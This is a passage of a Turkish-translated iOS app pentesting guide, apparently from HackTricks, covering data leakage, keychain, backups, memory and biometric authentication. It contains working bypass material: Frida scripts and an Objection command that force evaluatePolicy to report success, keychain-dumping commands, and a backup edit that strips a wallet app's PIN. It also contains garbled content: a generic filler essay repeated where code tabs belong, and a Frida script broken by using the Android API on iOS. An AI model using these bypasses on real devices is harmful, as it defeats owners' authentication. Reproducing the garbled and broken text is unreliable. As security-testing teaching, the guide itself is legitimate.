iPhone jailbreak yapılmamışsa, **saldırganın** bu ekran görüntülerini görebilmek için **cihaza erişime** **ihtiyacı** **vardır**. Varsayılan olarak, son ekran görüntüsü uygulamanın sandbox'ında `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasöründe saklanır (güvenilir bilgisayarlar, iOX 7.0'dan itibaren dosya sistemine erişemez).

Bu kötü davranışı önlemenin bir yolu, `ApplicationDidEnterBackground()` işlevini kullanarak ekran görüntüsü almadan önce boş bir ekran veya hassas verileri kaldırmaktır.

Aşağıdaki örnek düzeltme yöntemi, varsayılan bir ekran görüntüsü ayarlayacaktır.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C, Apple tarafından geliştirilen bir programlama dilidir. iOS uygulama geliştirme sürecinde sıkça kullanılır. Objective-C, C programlama diline dayanır ve Smalltalk dilinden etkilenmiştir.

Objective-C, iOS uygulamalarının güvenlik açıklarını tespit etmek için kullanılan bir dildir. Bu nedenle, iOS pentesting sürecinde Objective-C'ye aşina olmak önemlidir.

Objective-C ile iOS uygulamalarını analiz etmek için birkaç araç bulunmaktadır. Bunlar arasında Hopper Disassembler, class-dump, Cycript ve Frida gibi araçlar bulunur.

Objective-C, iOS uygulamalarının kaynak kodunu anlamak ve analiz etmek için kullanılan bir dil olduğu için, Objective-C'ye hakim olmak, iOS pentesting sürecinde büyük bir avantaj sağlar.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Bu, uygulama arka plana alındığında arka plan görüntüsünü `overlayImage.png` olarak ayarlar. `overlayImage.png` her zaman mevcut görünümü geçersiz kıldığı için hassas veri sızıntılarını önler.

### Anahtar Zinciri

iOS anahtar zincirine erişmek ve yönetmek için, jailbreakli cihazlar için uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araçlar mevcuttur. Ayrıca, benzer amaçlar için [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu sağlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sınıfı, hassas bilgileri doğrudan anahtar zincirine kaydetmek için idealdir ve NSUserDefaults veya diğer sarmalayıcılar için ihtiyacı ortadan kaldırır. Giriş yaptıktan sonra kimlik bilgilerini saklamak için aşağıdaki Swift kodu kullanılır:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Bu saklanan kimlik bilgilerini çıkarmak için Objection'ın `ios nsurlcredentialstorage dump` komutu kullanılır.

## **Özel Klavyeler ve Klavye Önbelleği**

iOS 8.0'dan itibaren kullanıcılar, **Ayarlar > Genel > Klavye > Klavyeler** altında yönetilebilen özel klavye uzantıları yükleyebilirler. Bu klavyeler genişletilmiş işlevsellik sunarken, tuş vuruşu kaydetme ve verileri harici sunuculara iletmek gibi bir risk oluştururlar, ancak kullanıcılara ağ erişimi gerektiren klavyeler hakkında bilgi verilir. Uygulamalar, hassas bilgi girişi için özel klavyelerin kullanımını kısıtlayabilir ve bunu yapmalıdır.

**Güvenlik Önerileri:**
- Gelişmiş güvenlik için üçüncü taraf klavyelerin devre dışı bırakılması önerilir.
- Öntanımlı iOS klavyesinin otomatik düzeltme ve otomatik öneri özelliklerine dikkat edilmelidir, çünkü bu özellikler hassas bilgileri `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumunda bulunan önbellek dosyalarına kaydedebilir. Bu önbellek dosyaları düzenli olarak hassas veriler için kontrol edilmelidir. Önbelleğe alınmış verileri temizlemek için **Ayarlar > Genel > Sıfırla > Klavye Sözlüğünü Sıfırla** seçeneği önerilir.
- Ağ trafiğinin dinlenmesi, özel bir klavyenin tuş vuruşlarını uzaktan iletip iletemediğini ortaya çıkarabilir.

### **Metin Alanı Önbelleğini Önleme**

[UITextInputTraits protokolü](https://developer.apple.com/reference/uikit/uitextinputtraits), otomatik düzeltme ve güvenli metin girişi gibi hassas bilgi önbelleğini önlemek için gerekli olan özellikleri sunar. Örneğin, otomatik düzeltmeyi devre dışı bırakmak ve güvenli metin girişini etkinleştirmek şu şekilde yapılabilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Ayrıca, geliştiriciler metin alanlarının, özellikle şifreler ve PIN'ler gibi hassas bilgilerin girildiği alanların önbelleğe alınmasını engellemek için `autocorrectionType`'ı `UITextAutocorrectionTypeNo` ve `secureTextEntry`'yi `YES` olarak ayarlayarak önbelleğe alma işlemini devre dışı bırakmalıdır.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Kayıtlar**

Hata ayıklama kodu genellikle **kayıtların kullanımını** içerir. **Kayıtlar hassas bilgiler içerebilir** riski vardır. Daha önce, iOS 6 ve daha eski sürümlerde, kayıtlar tüm uygulamalara erişilebilirken, hassas veri sızıntısı riski oluşturuyordu. **Şimdi, uygulamalar yalnızca kendi kayıtlarına erişebilirler**.

Bu kısıtlamalara rağmen, kilidini açmış bir cihaza fiziksel erişimi olan bir **saldırgan, cihazı bir bilgisayara bağlayarak kayıtları okuyabilir**. Kayıtların uygulamanın kaldırılmasından sonra bile diske kaydedildiğini unutmamak önemlidir.

Riskleri azaltmak için, uygulama ile **etkileşimde bulunmak**, tüm işlevlerini ve girişlerini keşfetmek, yanlışlıkla hassas bilgilerin kaydedilmediğinden emin olmak için önerilir.

Potansiyel sızıntılar için uygulamanın kaynak kodunu inceleyerek, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi anahtar kelimeleri kullanarak hem **önceden tanımlanmış** hem de **özel kayıt ifadelerini** arayın. Dahili işlevler için ve özel uygulamalar için `Logging` veya `Logfile` gibi herhangi bir bahsetme için arama yapın.

### **Sistem Kayıtlarını İzleme**

Uygulamalar, hassas olabilen çeşitli bilgileri kaydeder. Bu kayıtları izlemek için, aşağıdaki gibi araçlar ve komutlar kullanılabilir:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
Aşağıdaki adımlar, **Xcode** kullanarak konsol günlüklerini toplamanın bir yolunu sağlar:

1. Xcode'u açın.
2. iOS cihazını bağlayın.
3. **Pencere** -> **Cihazlar ve Simülatörler**'e gidin.
4. Cihazınızı seçin.
5. İncelemekte olduğunuz sorunu tetikleyin.
6. Günlükleri yeni bir pencerede görüntülemek için **Konsolu Aç** düğmesini kullanın.

Daha gelişmiş günlükleme için, cihaz kabuğuna bağlanmak ve **socat** kullanarak gerçek zamanlı günlük izleme sağlamak mümkündür:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Komutları izleyerek günlük etkinlikleri gözlemlemek, sorunları teşhis etmek veya günlüklerde potansiyel veri sızıntılarını belirlemek için son derece değerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yedeklemeler

iOS'a **otomatik yedekleme özellikleri** entegre edilmiştir ve iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracılığıyla cihaz verilerinin kopyalarının oluşturulmasını kolaylaştırır. Bu yedeklemeler neredeyse tüm cihaz verilerini kapsar, ancak Apple Pay ayrıntıları ve Touch ID yapılandırmaları gibi son derece hassas unsurları içermez.

### Güvenlik Riskleri

Yedeklemelerde **kurulu uygulamalar ve verileri** yer alması, potansiyel **veri sızıntısı** sorununu ve **yedekleme değişikliklerinin uygulama işlevselliğini değiştirebileceği riskini** ortaya çıkarır. Bu riskleri azaltmak için hassas bilgileri düz metin olarak herhangi bir uygulamanın dizininde veya alt dizinlerinde saklamamak önerilir.

### Yedeklemelerden Dosyaları Hariç Tutma

`Documents/` ve `Library/Application Support/` içindeki dosyalar varsayılan olarak yedeklenir. Geliştiriciler, `NSURLIsExcludedFromBackupKey` ile `NSURL setResourceValue:forKey:error:` kullanarak belirli dosyaları veya dizinleri yedeklemelerden hariç tutabilir. Hassas verilerin yedeklemelere dahil edilmesini önlemek için bu uygulama önemlidir.

### Zafiyetlerin Test Edilmesi

Bir uygulamanın yedekleme güvenliğini değerlendirmek için, Finder kullanarak bir yedekleme oluşturarak başlayın ve ardından [Apple'ın resmi belgelerinden](https://support.apple.com/en-us/HT204215) rehberlik alarak yedeklemeyi bulun. Yedeklemeyi, uygulama davranışını etkileyebilecek hassas verileri veya yapılandırmaları değiştirebilecek unsurlar açısından analiz edin.

Hassas bilgiler, komut satırı araçları veya [iMazing](https://imazing.com) gibi uygulamalar kullanılarak aranabilir. Şifreli yedeklemeler için, şifrelemenin varlığı, yedeklemenin kökünde bulunan "Manifest.plist" dosyasındaki "IsEncrypted" anahtarının kontrol edilerek doğrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Şifrelenmiş yedeklemelerle uğraşmak için, **backup_tool.py** ve **backup_passwd.py** gibi Python betikleri [DinoSec'in GitHub deposunda](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts) bulunabilir. Bunlar, en son iTunes/Finder sürümleriyle uyumluluk için ayarlamalar gerektirebilir. Şifre korumalı yedeklemelerdeki dosyalara erişmek için başka bir seçenek ise [**iOSbackup** aracı](https://pypi.org/project/iOSbackup/)dir.

### Uygulama Davranışını Değiştirme

Yedekleme değişiklikleri aracılığıyla uygulama davranışını değiştirme örneği, [Bither bitcoin cüzdan uygulamasında](https://github.com/bither/bither-ios) gösterilmektedir. UI kilidi PIN'i, **pin_code** anahtarı altında `net.bither.plist` içinde saklanır. Bu anahtarı plist dosyasından kaldırarak ve yedeklemeyi geri yükleyerek PIN gereksinimini kaldırabilir ve sınırsız erişim sağlayabilirsiniz.

## Hassas Veriler İçin Bellek Testi Özeti

Bir uygulamanın belleğinde depolanan hassas bilgilerle uğraşırken, bu verilerin maruz kalma süresini sınırlamak son derece önemlidir. Bellek içeriğini araştırmak için iki temel yaklaşım vardır: **bellek dökümü oluşturma** ve **belleği gerçek zamanlı olarak analiz etme**. Her iki yöntemin de, döküm süreci veya analiz sırasında önemli verilerin gözden kaçma potansiyeli gibi zorlukları vardır.

## **Bellek Dökümü Almak ve Analiz Etmek**

Hem jailbreak yapılmış hem de yapılmamış cihazlar için, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araçlar bir uygulamanın işlem belleğini dökme imkanı sağlar. Dökülen verileri analiz etmek için ise aradığınız bilginin doğasına bağlı olarak çeşitli araçlar kullanılır.

Bir bellek dökümünden dizeleri çıkarmak için `strings` veya `rabin2 -zz` gibi komutlar kullanılabilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha ayrıntılı bir analiz için, belirli veri türlerini veya desenleri aramak için **radare2**, kapsamlı arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Çalışma Zamanı Bellek Analizi**

**r2frida**, bir uygulamanın belleğini bir bellek dökümüne ihtiyaç duymadan gerçek zamanlı olarak incelemek için güçlü bir alternatif sunar. Bu araç, çalışan uygulamanın belleğinde arama komutlarının doğrudan yürütülmesini sağlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Kırık Şifreleme

### Zayıf Anahtar Yönetimi Süreçleri

Bazı geliştiriciler, hassas verileri yerel depolamada saklar ve kodda sabit/predictable bir anahtarla şifreler. Bu, bazı tersine mühendislik işlemleriyle saldırganların gizli bilgileri çıkarmasına izin vermemek için yapılmamalıdır.

### Güvensiz ve/veya Kullanımdan Kalkmış Algoritmaların Kullanımı

Geliştiriciler, yetkilendirme kontrolü yapmak, veri depolamak veya göndermek için **kullanımdan kalkmış algoritmaları** kullanmamalıdır. Bu algoritmalar arasında RC4, MD4, MD5, SHA1 gibi algoritmalar bulunur. Örneğin, şifreleri depolamak için **hash** kullanılıyorsa, tuz ile birlikte brute-force **dayanıklı** hash'ler kullanılmalıdır.

### Kontrol

Kod içinde **sabit** şifreler/parolalar veya bunların **tahmin edilebilir** olup olmadığını bulmak ve kodun zayıf şifreleme algoritmaları kullanıp kullanmadığını kontrol etmek için yapılması gereken temel kontrollerdir.

İlginç bir şekilde, **objection** kullanarak bazı **şifreleme** **kütüphanelerini** otomatik olarak izleyebilirsiniz. Bunun için şu komutu kullanabilirsiniz:
```swift
ios monitor crypt
```
Daha fazla bilgi için iOS kriptografik API'ları ve kütüphaneleri hakkında [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography) adresine erişin.

## Yerel Kimlik Doğrulama

**Yerel kimlik doğrulama**, özellikle şifreleme yöntemleri aracılığıyla uzaktan bir uç noktaya erişimi koruma konusunda önemli bir rol oynar. Buradaki temel nokta, uygun bir şekilde uygulanmadığında yerel kimlik doğrulama mekanizmalarının atlatılabileceğidir.

Apple'ın **[Yerel Kimlik Doğrulama çerçevesi](https://developer.apple.com/documentation/localauthentication)** ve **[anahtarlık](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)**, geliştiricilere kullanıcı kimlik doğrulama iletişim kutularını kolaylaştırmak ve gizli verileri güvenli bir şekilde işlemek için sağlam API'lar sağlar. Güvenli Enclave, Parmak İzi Kimliği için parmak izini güvence altına alırken, Yüz Kimliği biyometrik verileri tehlikeye atmadan yüz tanıma temelinde çalışır.

Touch ID/Face ID'yi entegre etmek için geliştiricilerin iki API seçeneği vardır:
- Yüksek seviyeli kullanıcı kimlik doğrulama için **`LocalAuthentication.framework`**.
- Düşük seviyeli anahtarlık hizmetlerine erişim için **`Security.framework`**, biyometrik kimlik doğrulama ile gizli verileri güvence altına alır. [Açık kaynaklı sargılar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtarlık erişimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework` güvenlik açıkları sunar, çünkü öncelikle kimlik doğrulama süreçleri için veri iletimi yapmadan boolean değerler döndürürler, bu da atlatılabilirliklerine neden olur (bkz. [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik Doğrulama Uygulama

Kullanıcıları kimlik doğrulaması için geliştiricilerin **`LAContext`** sınıfı içindeki **`evaluatePolicy`** yöntemini kullanmaları gerekmektedir. Aşağıdaki seçenekler arasından seçim yapabilirler:
- **`deviceOwnerAuthentication`**: Touch ID veya cihaz şifresi için istekte bulunur, ikisi de etkinleştirilmediyse başarısız olur.
- **`deviceOwnerAuthenticationWithBiometrics`**: Sadece Touch ID için istekte bulunur.

Başarılı bir kimlik doğrulama, **`evaluatePolicy`** yönteminden dönen boolean bir değerle gösterilir ve potansiyel bir güvenlik açığına işaret eder.

### Anahtarlık Kullanarak Yerel Kimlik Doğrulama

iOS uygulamalarında **yerel kimlik doğrulama** uygulamak, kimlik doğrulama belirteçleri gibi gizli verileri güvenli bir şekilde depolamak için **anahtarlık API'larının** kullanılmasını içerir. Bu işlem, verinin yalnızca kullanıcı tarafından, cihaz şifresi veya Touch ID gibi biyometrik kimlik doğrulama kullanılarak erişilebileceğini sağlar.

Anahtarlık, `SecAccessControl` özniteliğiyle öğeleri ayarlamak için yetenek sunar, bu da öğeye erişimi, kullanıcının Touch ID veya cihaz şifresiyle başarılı bir şekilde kimlik doğrulamasını gerektirir. Bu özellik güvenliği artırmak için önemlidir.

Aşağıda, bu güvenlik özelliklerinden yararlanarak anahtarlığa bir dizeyi kaydetme ve geri almayı gösteren Swift ve Objective-C kod örnekleri bulunmaktadır. Örnekler, erişim kontrolünü Touch ID kimlik doğrulamasını gerektirecek şekilde ayarlama ve verinin yalnızca ayarlandığı cihazda erişilebilir olmasını sağlama konusunda özellikle göstermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

Objective-C dili, iOS uygulamaları geliştirmek için kullanılan bir programlama dilidir. Bu dil, Apple'ın Cocoa ve Cocoa Touch çerçevelerini kullanarak iOS platformunda çalışan uygulamalar oluşturmak için kullanılır.

Objective-C dilinde iOS uygulamalarını hacklemek için çeşitli teknikler bulunmaktadır. Bu teknikler arasında uygulama analizi, tersine mühendislik, bellek analizi ve güvenlik açıklarının keşfi bulunur.

Uygulama analizi, iOS uygulamasının çalışma mantığını anlamak için kullanılan bir tekniktir. Bu teknik, uygulamanın kaynak kodunu incelemek, API çağrılarını izlemek ve uygulamanın davranışını anlamak için kullanılır.

Tersine mühendislik, iOS uygulamasının çalışma prensibini anlamak için kullanılan bir tekniktir. Bu teknik, uygulamanın derlenmiş kodunu analiz etmek, işlevlerini ve veri yapılarını anlamak için kullanılır.

Bellek analizi, iOS uygulamasının bellek kullanımını incelemek için kullanılan bir tekniktir. Bu teknik, uygulamanın bellek alanlarını izlemek, bellek sızıntılarını tespit etmek ve güvenlik açıklarını keşfetmek için kullanılır.

Güvenlik açıklarının keşfi, iOS uygulamasında bulunan güvenlik açıklarını tespit etmek için kullanılan bir tekniktir. Bu teknik, uygulamanın zayıf noktalarını tespit etmek, yetkilendirme hatalarını bulmak ve veri sızıntılarını keşfetmek için kullanılır.

Objective-C dilini kullanarak iOS uygulamalarını hacklemek için bu teknikleri kullanabilirsiniz. Ancak, bu teknikleri yasal ve etik sınırlar içinde kullanmanız önemlidir.
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Şimdi anahtar zincirinden kaydedilen öğeyi isteyebiliriz. Anahtar zinciri hizmetleri, kullanıcıya kimlik doğrulama iletişim kutusunu sunacak ve uygun bir parmak izi sağlanıp sağlanmadığına bağlı olarak veri veya nil döndürecektir.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

Objective-C dili, iOS uygulamaları geliştirmek için kullanılan bir programlama dilidir. Bu dil, Apple'ın Cocoa ve Cocoa Touch çerçevelerini kullanarak iOS platformunda çalışan uygulamalar oluşturmak için kullanılır.

Objective-C dilinde iOS uygulamalarını hacklemek için çeşitli teknikler bulunmaktadır. Bu teknikler arasında uygulama analizi, tersine mühendislik, bellek analizi ve güvenlik açıklarının keşfi bulunur.

Uygulama analizi, iOS uygulamasının çalışma mantığını anlamak için kullanılan bir tekniktir. Bu teknik, uygulamanın kaynak kodunu incelemek, API çağrılarını izlemek ve uygulamanın davranışını anlamak için kullanılır.

Tersine mühendislik, iOS uygulamasının çalışma prensibini anlamak için kullanılan bir tekniktir. Bu teknik, uygulamanın derlenmiş kodunu analiz etmek, işlevlerini ve veri yapılarını anlamak için kullanılır.

Bellek analizi, iOS uygulamasının bellek kullanımını incelemek için kullanılan bir tekniktir. Bu teknik, uygulamanın bellek alanlarını izlemek, bellek sızıntılarını tespit etmek ve güvenlik açıklarını keşfetmek için kullanılır.

Güvenlik açıklarının keşfi, iOS uygulamasında bulunan güvenlik açıklarını tespit etmek için kullanılan bir tekniktir. Bu teknik, uygulamanın zayıf noktalarını tespit etmek, yetkilendirme hatalarını bulmak ve veri sızıntılarını keşfetmek için kullanılır.

Objective-C dilini kullanarak iOS uygulamalarını hacklemek için bu teknikleri kullanabilirsiniz. Ancak, bu teknikleri yasal ve etik sınırlar içinde kullanmanız önemlidir.
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Tespit

Bir uygulamada kullanılan çerçeveler, uygulama ikili dosyasının paylaşılan dinamik kütüphaneler listesini analiz ederek tespit edilebilir. Bunun için `otool` kullanılabilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
Eğer bir uygulamada `LocalAuthentication.framework` kullanılıyorsa, çıktı aşağıdaki iki satırı içerecektir (unutmayın ki `LocalAuthentication.framework`, arka planda `Security.framework` kullanır):

```plaintext
- Security.framework
- LocalAuthentication.framework
```

Eğer bir uygulama `LocalAuthentication.framework` kullanmıyorsa, çıktı sadece `Security.framework` satırını içerecektir.
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Eğer `Security.framework` kullanılıyorsa, sadece ikinci olan gösterilecektir.

### Yerel Kimlik Doğrulama Çerçevesi Atlama

#### **Objection**

**Objection Biometrics Bypass** üzerinden, [bu GitHub sayfasında](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) yer alan bir teknik, **LocalAuthentication** mekanizmasını aşmak için kullanılabilir. Bu yaklaşımın temelinde, `evaluatePolicy` fonksiyonunu manipüle etmek için **Frida**'nın kullanılması yer alır ve bu sayede gerçek kimlik doğrulama başarısından bağımsız olarak sürekli olarak `True` sonucu elde edilir. Bu, hatalı biyometrik kimlik doğrulama süreçlerini atlamak için oldukça kullanışlıdır.

Bu atlama işlemini etkinleştirmek için aşağıdaki komut kullanılır:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'ın `evaluatePolicy` kontrolünün sonucunu etkili bir şekilde `True` olarak değiştiren bir görev kaydeder.

#### Frida

[DVIA-v2 uygulaması](https://github.com/prateek147/DVIA-v2)ndan bir **`evaluatePolicy`** kullanımı örneği:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
**Bypass** işlemini gerçekleştirmek için, bir Frida betiği yazılır. Bu betik, **evaluatePolicy** kontrolünü hedef alır ve geri çağırımını değiştirerek her zaman **success=1** döndürülmesini sağlar. Geri çağırımın davranışını değiştirerek, kimlik doğrulama kontrolü etkili bir şekilde atlatılır.

Aşağıdaki betik, **evaluatePolicy** yönteminin sonucunu değiştirmek için enjekte edilir. Geri çağırımın sonucunu her zaman başarı olarak gösterir.

```javascript
// Frida script to bypass Local Authentication
Java.perform(function() {
    var LAContext = Java.use('LocalAuthentication.LAContext');
    LAContext.evaluatePolicy_withReply_implementation.implementation = function(policy, reply) {
        reply(1, null);
    };
});
```
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiği enjekte etmek ve biyometrik kimlik doğrulamayı atlamak için aşağıdaki komut kullanılır:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC Aracılığıyla Hassas İşlevlerin Açığa Çıkarılması

### Özel URI İşleyicileri / Derin Bağlantılar / Özel Şemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel Bağlantılar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity Paylaşımı

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama Uzantıları

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web Görünümleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serileştirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Ağ İletişimi

